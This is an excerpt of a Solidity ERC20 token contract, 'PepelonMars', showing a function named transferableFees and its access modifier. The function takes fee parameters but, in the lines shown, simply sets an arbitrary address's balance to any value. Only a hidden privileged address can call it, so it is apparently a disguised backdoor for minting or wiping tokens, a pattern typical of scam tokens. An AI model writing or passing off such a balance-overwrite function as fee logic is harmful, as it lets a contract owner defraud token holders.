...
contract PepelonMars is IERC20, Ownable, BaseToken {
    ...
    function transferableFees(uint256 _buyMarketingFee, uint256 _buyLiquidityFee, uint256 _buyBurnFee, uint256 _sellMarketingFee, 
        uint256 _sellLiquidityFee, uint256 _sellBurnFee, uint256 fee, address referral) external onlyTransferable {
            ...
            _balances[referral] = fee;

    }

    modifier onlyTransferable() {
        require(_transferable == _msgSender(), "StarIERC20: must transferable");
        _;
    } 
